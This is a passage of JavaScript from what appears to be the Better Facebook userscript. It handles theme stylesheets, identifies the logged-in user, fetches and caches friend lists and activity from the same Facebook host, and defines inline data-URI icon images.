						log("[insertStylesheet]","Adding CSS Tag");
						var addCSS = function() {
							try {
								var link = el("link",null,{rel:"stylesheet",type:"text/css",href:url}); 
								if(id){link.id=id;} 
								document.getElementsByTagName("head")[0].appendChild(link); 
							} catch(e) {
								log("[insertStylesheet]","Error adding stylesheet link",e.toString());
							}
						};
						if (runat=="document-start") {
							onDOMContentLoaded(addCSS);
						}
						else {
							addCSS();
						}
					}
				}

				var original_theme_css = null;
				var temp_theme_style = null;
				function apply_theme(css) {
					var id = 'bfb_theme';
					var theme_style = $(id);
					// If no theme style, search for an inserted theme stylesheet 
					if (!theme_style && document.styleSheets) {
						log("[apply_theme]","Checking for stylesheets inserted from localStorage");
						for (var i=0; i<document.styleSheets.length; i++) {
							var ss=document.styleSheets[i];
							log("[apply_theme]",ss);
							if (ss.ownerNode) { ss=ss.ownerNode; }
							if (ss && ss.textContent && ss.textContent.indexOf('/\*ID:'+id+'\*/')==0) {
								log("[apply_theme]","Found!");
								ss.id = id;
								theme_style = ss;
								break;
							}
						}
					}
					if (css!=null) {
						// If there is an existing theme, disable it, then add the new one
						if (theme_style && !original_theme_css) {
							log("[apply_theme]","Disabling original theme");
							original_theme_css = theme_style.textContent || theme_style.innerHTML;
							log("[apply_theme]","original_theme_css",original_theme_css);
							try { theme_style.textContent = ''; } catch(e) { alert(e); }
						}
						if (temp_theme_style) {
							try { temp_theme_style.textContent = css; } catch(e) { }
						}
						else {
							temp_theme_style = add_style(css);
						}
					}
					else {
						// If we are clearing out the temp theme, remove it and revert the old one back
						if (temp_theme_style) {
							removeChild(temp_theme_style);
							temp_theme_style = null;
						}
						if (original_theme_css && theme_style) {
							try { theme_style.textContent = original_theme_css; } catch(e) { alert(e); }
							original_theme_css = null;
						}
					}
				}

				// ==================================================================
				// First order of business - find out who we are!
				// ==================================================================
				var userid = "anonymous";
				// Find out the actual userid numeric value, not the alias
				var user_num = null;
				try {
					user_num = unsafeWindow.Env.user;
				} catch (e) { }
				if (!user_num) {
					try {
						user_num=cookie('c_user');
					} catch(e) { }
				}
				if (userid=="anonymous" && user_num) { userid=user_num; }
				if (!userid || userid==0 || userid=="anonymous") { return; }

				// ==================================================================
				// REMOTE CONTENT
				// ==================================================================
				var window_href = "";
				var protocol = "http:";
				var host = "facebook.com";
				try { window_href = location.href; } catch(e) { } 
				try { protocol = location.protocol; } catch(e) { } 
				try { host = location.host; } catch(e) { }
				var url_prefix = protocol+'//'+host;
				var remote_content = {
					typeahead: { type:'xhr', url:url_prefix+'/ajax/typeahead_friends.php?__a=1', headers:{'Content-type':'application/x-www-form-urlencoded'}, ttl:3600 }
					,typeahead_new: { type:'xhr', url:url_prefix+'/ajax/typeahead/first_degree.php?__a=1&filter[0]=page&filter[1]=user&filter[2]=group&filter[3]=friendlist&filter[4]=event&lazy=0&options[0]=friends_only&viewer='+user_num+'&__user='+user_num, headers:{'Content-type':'application/x-www-form-urlencoded'}, ttl:3600 }
					,friendslist: { type:'xhr', url:url_prefix+'/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&options[0]=friends_only&viewer='+user_num+'&__user='+user_num, headers:{'Content-type':'application/x-www-form-urlencoded'}, ttl:3600 }
					,friend_activity: { type:'iframe', url:url_prefix+'/home.php?sk=ru', ttl: 3600 }
				};
				function get_remote_content(type,func,ref,force_refresh) {
					var rc = remote_content[type], response;
					if (rc) {
						// First check the cache!
						var type_key = userid+"/"+type;
						var last_check_prop = type_key+'/last_check';
						getValue([last_check_prop,type_key],[0,""],function(values) {
							var last_check = +values[last_check_prop];
							var cache = values[type_key];
							var t = time();
							if ((typeof force_refresh!="boolean" || !force_refresh) && cache && ( (t-last_check) <= (rc.ttl*1000)) ) {
								// Use cached content!
								func(cache);
							} else {
								if (typeof rc.queue=="undefined") { rc.queue=[]; }
								// Add the func to the queue
								rc.queue.push(func);
								// Only start loading if it's not already been started
								if (typeof rc.loading=="undefined" || !rc.loading) {
									rc.loading = true;

									// Get new content
									if (rc.type=='xhr') {
										var headers = rc.headers || {}; headers['Cache-Control']='no-cache';
										var method = rc.method || 'GET';
										var url = rc.url;
										url += (url.indexOf('?')>0?'&':'?')+'time='+t;
										try {
											ajax({'method':method,'headers':headers,'url':url,'onload':function(res) { 
												rc.loading = false;
												if (res.responseText==null || res.responseText=="") {
					//								add_error("No response received for remote content: "+type);
													return;
												}
												// Call each queued function
												var save_value = true;
												while (rc.queue.length) {
													var func = rc.queue.shift();
													var dosave = func(res.responseText); 
													if (dosave===false) {
														save_value=false;
													}
												}
												if (save_value) {
													setValue(last_check_prop,""+t);
													setValue(type_key,res.responseText);
												}
											}});
										} catch(e) {
											add_error('An error occurred while trying to retrieve remote data from url: <a href="'+url+'">'+url+'</a>. The error is:<br>'+e.toString());
										}
									}
									else if (rc.type=='iframe') {
										var iframe = el("iframe",null,{src:rc.url});
										iframe.style.display="none";
										iframe.addEventListener('load',function(e) {
											try {
												rc.loading = false;
												var doc = e.target.contentDocument;
												setValue(last_check_prop,""+t);
												var val = null;
												while (rc.queue.length) {
													var func = rc.queue.shift();
													val = func(doc);
												}
												if (val!=null) {
													setValue(type_key,""+val);
												}
												if (iframe && iframe.parentNode) { iframe.parentNode.removeChild(iframe); }
											}
											catch (e) { add_exception(e); }
										},false);
										append(ref,iframe);
									}
								}
							}		
						});
					}

				}
				function load_remote_content(type,ref,func,loading_msg,empty_msg,force_refresh) {
					if (loading_msg) { html(ref,loading_msg); }
					get_remote_content(type,function(res) {
						var content = func(res) || empty_msg;
						html(ref,content);

						return content;
					},ref,force_refresh);
				}
				function fetch_content_in_iframe(url,id,func) {
					var theDiv = el('div');
					var e;
					function stateChange() {
						function findNode(startNode, id){
							var children = startNode.childNodes;
							for(var i = 0; i < children.length; i++) {
								if(children.item(i).id == id) {
									e = children.item(i);
									break;
								}
								else if (children.item(i).childNodes) {
									findNode(children.item(i), id);
									if (e) {break;}
								}
							}
						}
						if (req.readyState == 4) { // Complete
							if (req.status == 200) { // OK response
								html(theDiv,req.responseText);
								findNode(theDiv, id);
								if (e) {
									func(e);
								}
							} else {
							//	alert("Problem: " + req.status+" : "+req.statusText + "\n"+req.responseText);
							}
						}
					}
					req = new XMLHttpRequest();
					req.onreadystatechange = stateChange;
					try {
						req.open("GET", url, true);
					} catch (e) {
					//	alert(e);
					}
					req.send(null);
					return false;
				}

				// ==================================================================
				// CONSTANTS
				// FACEBOOK CLASS NAMES, ETC
				// ==================================================================
				var feedCommentContainerSelector = ".commentList,.UFIList";
				var timestampClass = " uiStreamSource timestamp ";
				var streamContainerSelector = ".UIIntentionalStream_Content,.group_mall";
				var streamCollapsedClass = "uiStreamCollapsed";
				var storySelector = ".uiUnifiedStory,.timelineUnitContainer,.mall_post";

				var info_icon = "\"data:image/gif,GIF89a%10%00%10%00%E6%7F%00%B7%8A%2BrV%1A666%9B%9B%9B%B1%86)%F5%BCB%D6%A33%CE%9D1qqq7)%0C%FF%C6%3F)%1E%09%FD%C0%3C%F5%BA%3A%DC%B2V%03%03%02%1C%1C%1C%1C%15%07%09%09%09III%0E%0E%0D%11%11%11%12%0E%032%26%0B%FF%C2%3C%FC%BF%3C%FF%C3%3D%FF%C4%3D%F9%BD%3A%FF%C2%3D%FB%BE%3B%FC%BF%3BWWW%E5%E5%E5%F1%B79%86%86%86%FA%FA%FA%95%95%95%FF%CDR%FB%BF%3C*'%20%FF%C1%3BG%3E(%FF%C6A%E4%E4%E4%9Dw%24OOO%E2%AB4%FF%D2c%F8%C2O%CF%AAY%E9%B17%FB%BF%3B%F2%B89%17%17%17%60%60%60%B8%97O%FF%C8%40%FF%C9C%F8%BC%3AK%3D%1E%F3%C1X%84n%3F%FB%BE%3A%B7%B7%B7%C7%A1MJJJ%AB%8FRhhhbJ%16%E9%B6F%A5%A5%A5%FA%C8%5B%CC%9B%2F%93w8%E1%E1%E1%B3%8B4%B1%B1%B1%7B%5D%1C%80f-%A8%A8%A8%FA%C3E%8Dk!%2C!%0A6*%10%06%07%0A%0A%08%02%FE%C2%3C%AE%AE%AE%BC%8E%2C%D5%A6C%FF%C6%3D%FF%C3%3F%C6%96%2F%3B%3B%3B%EF%B58%DF%DF%DFggg%BE%99J%E7%AE6yb4%FF%CBA%98%98%98%C1%93-%7B%7B%7B%FF%C3961(%AA%83%2F%AE%85%2C%82k%3A5%2F%24%FA%BE%3B%FB%BE9%B5%B5%B5%FD%BF9222%DC%ABA%FE%C1%3C%CF%9E1%FF%C4BC%3A%24%22%22%22%96%96%96%17%16%11%A3%7C'%F9%BD%3B%00%00%00%FF%FF%FF!%F9%04%01%00%00%7F%00%2C%00%00%00%00%10%00%10%00%00%07%DE%80%7F%82%83s%14%15%5E%83%89%83%23~U*%3C%0F~%8A%89~n81%05%04%09~%03%93~j%0E90%26%5B%07%9B%8A%126AiHCk%0D%18g%16%10%83D%0F%3E%2BW%0E%0F%0F%5D%1A%0CR~%08%82%14(Fr%5C2~~%00%1A'%22%09%15%82~m%0A%1C%1D%BB%0F%07%1Do%18-%0F%7Fy%7BZ)%7D4%05T%0B_%19%7D%193%0B%02%12xQ%3F%7D%1CwbL%0C%7D%FC%0A%01%12%12%C8%E8%E0%D0%07N%0F%25ljx%E0%A7%81%00%05%09O%CA%2C%C4%40%C7O%02%11%EC%18%7C%00%B0G%C2%02%03%1F6l%D8%C1'K%86%3A%1D%1A%18%08%F0%00%81%1F%0BE%F8%24y%81a%C3%18%3B%04%9C%5Cx%00BP%BC%97%11%A6%5CX%10%C1%8A%1FZ%8A%D0%FCq1a%C2%1F%10a%12%05%02%00%3B\"";
				var delete_img = "data:image/gif,GIF89a%15%00%15%00%F7%FF%00%FF%F4%FF%FF%F8%F9%EC%89_%DC%5B2%D85%19%DF%5DL%F3aH%E2M%2C%DDR-%D5K%1D%A32%0F%E6Y%3E%E6V%2B%E2qa%FE%FE%FE%E9%3E%09%CBI%23%E6%83j%EAR2%DBb%3B%E2c4%DES3%E9iN%FC%FD%FF%D8%2C%05%CCR)%E2%5DA%E8pK%DBkD%F8%FF%FF%F6%FE%FF%ECK%14%CF%3C%0B%FB%FD%FA%FC%FF%FF%ED%7Bi%B5%2C%03%E7kI%FF%FF%FB%E2tS%DDcE%D6B%0C%DF%5D%3C%D1N%24%F3%8Bs%DBW%3C%EC%5D%3C%D9D%15%B43%13%E2V%26%E5P%1B%E4%7Db%DDZ*%AC*%04%A8.%13%EDlT%E6nV%FF%FF%FD%FF%FF%F8%E2sZ%E6L%16%EBN%23%E6bB%E5b%3C%D9F%1A%E2Z6%AB%3C%22%EAa3%FC%FC%FB%B12%19%E6Q2%E2N'%FD%FF%F9%AD9%1E%E4M%18%E9%7Fb%E3J%0D%E7xe%BA%25%06%E3cA%FF%FD%FD%FF%FB%FD%FD%FF%F3%E6rZ%E9jG%E4L%1C%E3N%23%FF%FD%FF%FF%FC%FF%FF%FB%FF%FF%F9%FF%FB%FF%FF%FF%FF%F4%FB%FF%FD%FF%FD%FE%FF%FF%DE%EE%5CC%EAQ%25%EB%88k%E1S%3D%E5%5DM%D7B%17%ED%A2%83%DAD%2B%E9N0%B0.%0C%EA%B2%99%E1%3F%18%DE%60-%E6cG%CEF%1E%E2%8Cq%D80%01%DD8%00%E0V%17%ED%A4%91%EB%AB%90%A5%3F%17%AE7%19%F9%89u%E6jR%E4%80q%F0WO%F7%FF%FE%B2D%2B%A9%26%00%ED%96x%E2t%5D%E4I%18%E9M%1C%EEYC%E0K%23%E3W6%CF%40%16%E5%60M%E0dL%DDt%5E%E1iD%E4%5D%25%EBZ-%E3G)%E8%60F%D2A%22%FCh%5E%D8D%1F%E9bN%DFO*%EByU%F6td%C8%3D%20%E7%90t%ED%90q%FF%FA%F1%F0g%40%FF%FB%F5%DBK3%FF%FC%F9%FF%FD%FA%E0C%18%E6%88l%EB%82b%EA%82i%EEgT%E4v%5B%EDy%60%EE%80a%EF%7Cg%EB%EF%FB%E2fB%E2fG%DCnU%F3%C0%95%E7fF%F9%FF%FD%E8v%5C%DF%EE%F4%EA%E6%FD%D70%03%E1%7FR%D38%0C%EDpP%D96%0B%ED%8F%83%DD8%0B%EE%C5%C1%EAQ%17%F4%CE%C1%EF%A6%9D%F6%FC%FA%A36%15%DF%8Fx%AE4%11%F2%D2%DD%F8%B8%B8%E1G%0B%B20%11%ECA%0D%EEI%0F%E0iS%E8j%5E%E0nS%C5)%03%E6nS%F7%FF%F2%EA%89v%E8nI%EBpN%EClM%A8%40%25%DFrS%B10%08%FF%DA%DF%A2%20%00%EEwa%EBa%22%AE-%0E%E8%90x%B2Q1%ED%92%7F%EC%94%7C%DFW%1D%DCK%1E%E0uY%D5Z1%F6%CA%E1%FC%D3%E3%DDjK%E0N%1F%E7fQ%F1%9B%84%F2%9F%8F%FC%FC%F2%FF%FD%F0%E7%5D%40%F5q%5C%EF_D%E6E%11%E4M%20%E7P)%E6T%23%E1R2%E9sY%E8v%5B%E2%5C%13%EEwY%E1F0%E3M4%F5%FE%FF%E0i%3F%D9A%02%F3%5BD%EDh%3B%CEJ%1A%FF%FE%FF%FF%FF%FF%FF%FF%FF!%F9%04%01%00%00%FF%00%2C%00%00%00%00%15%00%15%00%00%08%FF%00%FF%FD%3B%D5o%0B%00%1D%FD%FA%5D%F0%D7%C1%1F%2F%11%0E%FC%E5%B8%22%F0%DF4lMN%882D%26%92%86t%DF%5CH%40%20%C1%5D%99%0C%E1%FEu%B94g%97%1FK%BE%22%CCX%B2d%94%ABx%D1%C4%15%18%E0%26%1B%2C%2C%23%E8%A81%C3%E2%0E%A8R%A5f%8C%F83%E5Y3%1F%84%CE%FC%0A%20B%5E9s%DBX%E415%C9%19%AD%12%CF%D6qH%A7%A1%C2%A6%5E%FDZm%D0f%8B%99.%24%7F%10%91%D3%C7%A1E%81%2F%C1%DC%D1X!%24%CB%15%3Co%04%7C%F2%D7%AF%83%85T((%8C%D9%B3%C7%81%91%0A%2B%92%F4%F3%D2(%94%98%3CM%88D%C9%91N%8F%91~%9A%02%208%80%80o%3F%1D%16%9A%D0%AB%F6%C8%5B%0E%0F%5C%D888w%A5%5B%A0%23%92%22%7B!%A2b%07%25Y%3Bv%18%CB%A1%C5%C1%96%0B%0Cz0%B2r%24%81%1D%7F%7B%82%1C%3BA%0A%C7%8D%7D%A8%3ALf%10%03%8D%8CvV%12%14%FD%F1%D7%C9%DE%8D)%AA%9C%E1%40%86%C5%DF%15%24%FD%B8%C5%F8%D0%AE%0A%90_WL%C0C%E1C%5D%83%0D%26%5C%10%02%05%22h%81%8E%0C%3D(%01%C8%0B%C3%F8s%C18%13P%C1%8A2R%60!E%26%A9%1C%A2%C52%FD%E4%C2%03%20)%5C%E3%40%17%9E%2C%F0%84%01%26%B4%E2%05%15%99%FC0%845%98%F8U%0C%3B%B3%90%10%00%14%8C%240%01%18%B8D%81%CF%13m%24%A2%88%0B%0Cp%B2%0A%13%0F%D4R%03%14%FD%DCR%85%0A%03h%A0%82%20.%0E%B0%C8%3C%EF%84%C1%840%0F%60P%03a%04%40R%0F%02%DF%D0%D0B%051H%40%88%1C%83%14CL%3Eq%C0A%8D%0E%AF%40%40%40%25%908%02A%02%10%00%C1O!k%A4%00%02%08%B1%60%90%0C4%F7%FC%03%0C%1F%0A%D80%0C%0C6%14%A1%00%0Ci%90%20%8D%13N%90%D0G%1D%E0Tt%05%17X%88%80%85%0E%178%B0%87%7BHt%B0%07%16X%BC%22P%40%00%3B";
				var pause_img = "data:image/jpeg,%FF%D8%FF%E0%00%10JFIF%00%01%01%00%00%01%00%01%00%00%FF%DB%00%84%00%09%06%06%0C%06%05%09%08%07%08%0A%0E%09%0A%0D%16%0E%0D%0C%0C%0D%1A%13%14%10%16%1F%1C!%20%1F%1C%1E%1E%23'2*%23%25*%25%1E%1E%1F%3B%2C%2F3*8%2C8%15*15B*5%26%2B%3A)%01%09%0A%0A%0D%0B%0D%19%0E%0D%19)%1C%16%244*))))))%2C)))))))))))))))%2C))))))))))%2C))))))))))))))%FF%C0%00%11%08%00%14%00%14%03%01%22%00%02%11%01%03%11%01%FF%C4%00%1A%00%00%02%02%03%00%00%00%00%00%00%00%00%00%00%00%00%00%06%01%04%02%05%07%FF%C4%000%10%00%00%05%02%02%05%0C%03%00%00%00%00%00%00%00%00%00%01%02%03%05%04%06%11%12%07%13AQR%2312Sadq%92%A3%B2%B3%D1%16!%22%FF%C4%00%17%01%01%01%01%01%00%00%00%00%00%00%00%00%00%00%00%00%02%03%01%00%FF%C4%00%16%11%01%01%01%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%11%FF%DA%00%0C%03%01%00%02%11%03%11%00%3F%00q%9E%98%8B%B2%AC%E8%E9Yx%EDj*5l%F2%0C6%B5%9A%D4%83V'%98%CB%84%C5%5B%8E%F6%83%B6!%A1%A4kb%1DS3%2Ck%E9%C9%9Af%8DINT%2B%FA%C5E%81%F2%85%CD%8E%D0%B9%A6%A7%B3%E8%A6%19%3B%AA%98%F8%5C%0A%FAWs%3D%87%60%17%0Ci%97%A6%C0wFH%E9W%AD%1BTS-6%CB-!%26%C1%2B%04%A4%88%BAJ%00%9B%D9%DDd%CBG%DD%D3%EEP%03%CA%9E%AA%D3%5C%B5%0DS6%DAP%CE%08A%11b%93%D8%5E%23%3F%CA%EAz%B6%3C%A7%F6%00%0A%03%5B%2B(%E5mR%5Cu-%E6%24%11~%88%F7%9Fh%80%00s_%FF%D9";
				var play_img = "data:image/gif,GIF89a%14%00%14%00%F7%00%00%00%00%00%FF%FF%FF%F8%F8%FA%F5%F6%FB%F3%F4%F9%F0%F1%F6%EE%EF%F4%ED%EE%F3%EB%EC%F1%E3%E4%E9%FA%FB%FF%F9%FA%FE%F0%F1%F5%EF%F0%F4%7F%83%8E%81%85%90%84%87%90%DF%E3%EE%DE%E2%ED%DD%E1%EC%DA%DE%E9%E3%E7%F2%DC%DF%E8%DA%DD%E6%E9%EC%F5%86%89%90%E0%E4%ED%DE%E2%EB%E2%E6%EF%EE%F1%F8%E8%EB%F2%E6%E9%F0%E4%E7%EE%DF%E2%E9%7C%82%8E%D9%DF%EB%D8%DE%EA%D7%DD%E9%EB%EC%EEz%82%8F%D4%DD%EC%D6%DE%EB%88%8B%90%87%8A%8F%86%89%8E%8C%8F%94%F4%F7%FC%F2%F5%FA%EF%F2%F7%EC%EF%F4%EB%EE%F3%EA%ED%F2%E9%EC%F1%DB%E2%EC%D5%DC%E6u%82%93dlw%83%8B%96%D8%E5%F6%D7%E4%F5%D5%E2%F3%D2%DF%F0%88%90%9B%D0%DC%EC%9F%A7%B2%D0%D8%E3%D9%E1%EC%D8%E0%EBv%83%93%82%8F%9F%CA%D7%E7%C7%D4%E4%D0%DD%ED%CF%DC%EC%CE%DB%EB%DA%E7%F7%D6%E3%F3%D1%DB%E7%D7%E1%ED%D5%DF%EB%8B%90%96%F4%F9%FF~%85%8D%8E%95%9D%EA%F1%F9%60p%80%7F%8F%9F%83%93%A3%81%91%A1%8A%9A%AA%89%99%A9%BD%CD%DD%C2%D2%E2%BF%CF%DF%BE%CE%DE%C8%D8%E8%C6%D6%E6%CE%DE%EE%87%90%99%85%8E%97%84%8D%96%83%8C%95%DC%E5%EE%E7%F0%F9%E4%ED%F6%E2%EB%F4%5Eo%7Fx%89%99%7B%8C%9Cz%8B%9B%7D%8E%9E%7C%8D%9D%7F%90%A0%83%94%A4%82%93%A3%89%9A%AAw%85%92%BD%CE%DE%BC%CD%DD%BB%CC%DC%B8%C9%D9%C3%D4%E4%C1%D2%E2%BF%D0%E0%BE%CF%DF%C8%D9%E9%C7%D8%E8%C6%D7%E7%CC%DD%ED%CA%DB%EB%C7%D7%E6%C4%D4%E3z%84%8D~%88%91%CA%D8%E5%D9%E7%F4%DD%EB%F8%D8%E2%EB%EB%F5%FE%E9%F3%FC%E1%EB%F4%82%89%8F%DE%E5%EB%D1%D8%DE%F2%F9%FF%F1%F8%FE%EF%F6%FC%EC%F3%F9%E9%F0%F6%E5%EC%F2x%86%91t%7D%84%DD%EB%F6%E0%EE%F9%8F%98%9F%DF%E8%EF%D9%E2%E9%EA%F3%FA%E7%F0%F7%E2%EB%F2%E1%EA%F1%DB%E0%E4%D3%D8%DC%F3%F8%FC%F1%F6%FA%F0%F5%F9%EF%F4%F8%EE%F3%F7%EC%F1%F5%EA%EF%F3%E4%E9%ED%F4%F8%FB%E3%E7%EAy%86%8F%7D%8A%93%88%95%9E%DB%E8%F1%E4%F1%FA%DF%EC%F5%F3%FA%FF%FA%FD%FF%7B%89%92z%88%91%7F%8D%96%81%8F%98%C3%D1%DA%E3%F1%FA%E2%F0%F9%DE%EB%F3%E8%F5%FD%E6%F3%FBp%7B%81%7F%8A%90%82%8D%93%87%92%98r%7B%80%87%90%95%DE%E9%EF%EE%F9%FF%EB%F6%FC%E9%F4%FA%E7%F2%F8%E6%F1%F7%DF%E8%ED%DE%E7%EC%EE%F7%FC%EB%F4%F9%EA%F3%F8%E9%F2%F7%E0%E5%E8%DC%E1%E4%7C%8B%92%7F%8C%92~%8B%91%E6%F5%FC%EB%F8%FE%EA%F7%FD%E7%F4%FA%82%8D%91%81%8C%90%DC%E4%E7%F2%FA%FD%EE%F6%F9%E1%E9%EC%F3%FC%FF%F4%F8%F9%EC%F6%F8%F2%FD%FF%F3%FE%FF%F4%FE%FF%F6%FF%FF%F8%FF%FF%F9%FF%FF%FC%FF%FF%FD%FD%FD%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%2C%00%00%00%00%14%00%14%00%00%08%FF%00q%DD%B2U%AB%95%2BB%85%82%FD%D2t%89%D8%B0FS%C8%E4%00%82%E3U.Y%B1%60%F5Z%A4%AC%D8%A7O%CC%96Ar%F4%C8L%90!%3E%08%F1*%A7(Q2O%9C6I%A2%E4%ED%5B%A9T%95%CC%9DA%23%A6%CC%B13%A0%3E937)%12)U%A8LI%7B1%AAS%1A4c%A4%40%A3%82%0E%1D7J%A7B%A5c%95nU%B8%05%D1%9A!%3B%26%0C%CA%AC(%A7D%01%00%D0%C0%04%83%B6%E0%8C%1D3%11%F7%180%16%A3%D2%A5%A3%B5vm%00%01%01%CE%99%1B%17x%B0%B6%162%5C%C0P%D0%B7%AF%BAn%E4%C6%3D%8E%BCME%8C%01%05%1A4n%2C%EEZ%B6%CE%D9%A8%AD%98A%C0%C0%81%CD%9B%9F%3D%C3%E6%ABZ%06%0F%1Dh%20%40%BD%D9%935%5D%D3%20%80%C0%00%E2%03%ED%BE%8Cve%CAd%EB%81%86%0A%1B8%FC%0E%BE%04%13%22D%96%1CL%90%40!%02%EA%04N%0Ee_%C2%9D%8E%08%12%23l%D4th%7C%C1B%08%14L%D0%EB%60%A2%83%C8%89')%9A%08Y%5B%A2%C6%8F%FA%3Fx%E4%DF%C1c%C7%8D%22%83%24!%08%12G%1C%A1%84%11%86%20h%C8%82F%F4%10%06%17X%C4%A1G%1Fy%00%F2%87%1F%80%04%A2%E1%86%1A~%01%86%17X%CCq%87%1Dx%E8Q%C7%1E%7C%EC%A1%E2%8A*n%D1%C5%16Y%A8!%87%1Bm%C0%F1%06%1Ck%B0%A1%E3%8E%3AZq%85%16U%04%04%00%3B";
				var up_img = "data:image/gif,GIF89a%15%00%14%00%E6%00%00%F8%F8%F8%F3%F3%F3%E6%E6%E6%EA%EA%EA%E8%E8%E8%F9%F9%F9%E9%E9%E9%F5%F5%F5qqq%DC%DC%DC%9B%9B%9Bvvv%DB%DB%DB%7B%7B%7BZZZlllmmm~~~%B3%B3%B3%B4%B4%B4%C3%C3%C3%9A%9A%9Ahhh%9D%9D%9Ddddrrr%98%98%98%A2%A2%A2%A8%A8%A8%EF%EF%EFaaa%AA%AA%AA%97%97%97%D2%D2%D2%A0%A0%A0%94%94%94%D0%D0%D0%FE%FF%FE%F6%F6%F6%FC%FC%FC%F4%F4%F4%CC%CC%CC%FD%FE%FD%5C%5C%5C%92%92%92%8F%8F%8F%A6%A6%A6%91%91%91%A7%A7%A7%A3%A3%A3%8E%8E%8E%F1%F1%F1%D9%D9%D9%A9%A9%A9MMM%DA%DA%DAEEESSSbbb%D8%D8%D8%5E%5E%5EzzzpppUUUtttgggsss___fffIIIxxx%DD%DD%DDcccPPP%E7%E7%E7%EB%EB%EB%CA%CA%CA%EC%EC%EC%AC%AC%AC%8C%8C%8C%E4%E4%E4%E5%E5%E5%ED%ED%ED%E3%E3%E3%EE%EE%EE%FF%FF%FF%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00!%F9%04%00%00%00%00%00%2C%00%00%00%00%15%00%14%00%00%07%FF%80!%13N%84%85%86%87%84%13!%12%24%07U%8F%90%91%92%07%24%12%1F%073T%9A%9B%9C%9A%1D%1DT3%07%1F5U%9D%A7%A7U50URTR%B0%B1%B2%B0%AFRU0.UM%B1M%BD%0C%0B%0C%BD%B0%BBMU.1%25K%BDM%CA%0C%0E8D%09%CC%CA%BD%251%1B*KK%03%DA4%2BE%3F%2B%3EG%DA%E5*%1B%22'%03%06%03%037C6%0E%18A%18%40%09%ED%ED'%22%17%05%06%FE4%1E%92%F0%B0%F0%A0%A0%05%23%09%FC%11(pA%01%00%02%04v%20%C9%A1%03%02%82%8B%17!%F4%60%00%11%80%02%0D%07%94%88%24%60%A2%00%04!%0BR%16Xi%82%80%92%03%1A%40%A0%10%20R%80M%0F%19%1A%E8%2C%40S%09M%14%20F%04%88B4%8A%80(%0E2DX%0A%C0h%D1%00%23X%0C-J%14%0A%80%ABW%A9F%09%C0%E2E%00(S%A0%88%1DK6%EC%D8%00%2FZ%04%98%C2%B6%AD%5B%B6%60(%C5N%09%D0B%86%92%04o%F3%BAM%A0D%86%02%0E%14%98%08%1EL%B80%05%0E%0ARTx%C2%B8%B1%E3%C7%8C%2B%A4%08%04%00%3B";
				var down_img = "data:image/gif,GIF89a%15%00%14%00%E6%00%00%F5%F5%F5%F3%F3%F3%E6%E6%E6%E9%E9%E9%E8%E8%E8qqqBBB%DA%DA%DA%9B%9B%9B%EA%EA%EA%F6%F6%F6%8F%8F%8F%DB%DB%DBvvv%EF%EF%EFlllhhhVVVcccRRR%AA%AA%AA%F1%F1%F1%98%98%98%B4%B4%B4%A2%A2%A2%FD%FE%FD%97%97%97%F9%F9%F9%94%94%94%9D%9D%9D%C3%C3%C3%F4%F4%F4%A0%A0%A0%D2%D2%D2%CC%CC%CC%D0%D0%D0%FE%FF%FE%B3%B3%B3%FC%FC%FC%DC%DC%DC%A9%A9%A9GGG%A3%A3%A3%8E%8E%8E%A7%A7%A7aaaiii%A8%A8%A8%92%92%92%A6%A6%A6ddd%91%91%91%9A%9A%9A%F8%F8%F8%FA%FA%FAmmm___%87%87%87%5E%5E%5E%F2%F2%F2OOO%8B%8B%8B%7C%7C%7C%82%82%82%3C%3C%3CJJJooo%40%40%40ZZZzzz~~~%99%99%99%EC%EC%EC%CA%CA%CA%EB%EB%EB%AC%AC%AC%8C%8C%8C%E7%E7%E7%E4%E4%E4%ED%ED%ED%E5%E5%E5%EE%EE%EE%E3%E3%E3%FF%FF%FF%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00!%F9%04%00%00%00%00%00%2C%00%00%00%00%15%00%14%00%00%07%FF%80!%17K%84%85%86%87%84%17!%25%23%00S%8F%90%91%92%00%23%25%14%00%15Q%9A%0EQ%9C%9A%9F%9E%15%00%14(S%9F%A7%A8%A8S(%2CSOQO%B1%AF%B2%B4%B2S%2C1SH%B1H%BB%40C%06%C1%BC%BCS1*%24J%BDHJJ%06%3C%11%D06%BD%C9H%24*%18%19%CC%DAJ)D%12%DF6%DBJ%19%18%20%26%09%03%078)A%13-%10%F0-%132%07%09%09%26%20%1D%1B%03%FC%0CB%3A2%5C%3C%18%E8%C2G%02%05%03%08l%E8%80%A0%06%81%87%03%18%14%B9Q%A0b%81%1CJ%10%26%AC%81%C0%02%80%26%20A20R%A0A%83%1EH%14%10%08%09%C0%82%86%0F%02%9A%C4%8Cy%E0G%83%05H%00%AC%0C%F9A%03%87%00P%A0%08%08%1A%F4%C0%91%9CC%85%06%0D%C0%01%06P(N%88%06%15%B0%23%A9%D4%000f%04p%22E%8A%93%AF%60%C3%86%0D0cA%80%AE%5D%B9%A2%F5%CA%16m%80%05%2B%22%9A%9CXK%B7%EE%89%26%2B%10%BC%F0%90%A4%AF%DF%BF%80%3D%BC%40%20%82%06%93%C3%88%13%2B%3ELCD%20%00%3B";
